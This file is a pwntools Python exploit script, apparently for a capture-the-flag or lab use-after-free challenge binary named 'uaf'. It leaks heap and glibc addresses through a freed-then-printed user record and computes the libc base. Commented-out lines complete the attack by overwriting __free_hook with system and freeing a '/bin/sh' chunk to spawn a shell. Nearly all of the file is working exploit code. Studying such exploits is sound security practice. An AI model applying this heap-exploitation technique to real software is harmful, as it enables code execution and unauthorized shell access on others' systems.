from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-h", "-f"]

p = gdb.debug("./uaf", '''
    b new
    continue
''')

def new(name, group, uid, gid, bio):
    p.sendline(b'1')
    __edit(name, group, uid, gid, bio)

def __edit(name, group, uid, gid, bio):
    p.recvuntil(b"name:\n")
    p.sendline(name)
    p.recvuntil(b"group:\n")
    p.sendline(group)
    p.recvuntil(b"uid:\n")
    p.sendline(str(uid).encode())
    p.recvuntil(b"gid:\n")
    p.sendline(str(gid).encode())
    p.recvuntil(b"bio:\n")
    p.sendline(bio)
    p.recvuntil(b" >")

def edit(name, group, uid, gid, bio):
    p.sendline(b'2')
    __edit(name, group, uid, gid, bio)

def _print():
    p.sendline(b'3')
    return p.recvuntil(b" >")

def delete():
    p.sendline(b'4')
    p.recvuntil(b" >")

p.recvuntil(b"> ")
new(b"ian", b"user", 1000, 1000, b"prof")
delete()
leak = _print()
heap_leak = leak[leak.find(b"User: ") + len(b"User: "):]
heap_leak = heap_leak[:heap_leak.find(b',')]
heap_leak = u64(heap_leak.ljust(8, b'\x00'))
# print(hex(heap_leak))
glibc_leak = leak[leak.find(b"Bio: ") + len(b"Bio: "):]
glibc_leak = glibc_leak[:glibc_leak.find(b'P')]
glibc_leak = u64(glibc_leak.ljust(8, b'\x00'))
print(hex(glibc_leak))

heap_base = heap_leak & ~0xfff
glibc_base = (glibc_leak & ~0xfff) - 0x1ec000
# print(hex(heap_base))
print(hex(glibc_base))
#
# e = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
# e.address = glibc_base
# free_hook = e.symbols.__free_hook
# system = e.symbols.system
# edit(p64(free_hook), 'BBBBBBBB', 10, 10, p64(glibc_leak) + p64(glibc_leak))
# new(p64(system), 'BBBBBBBB', 10, 10, b"/bin/sh\x00")
# p.sendline(b'4')

p.interactive()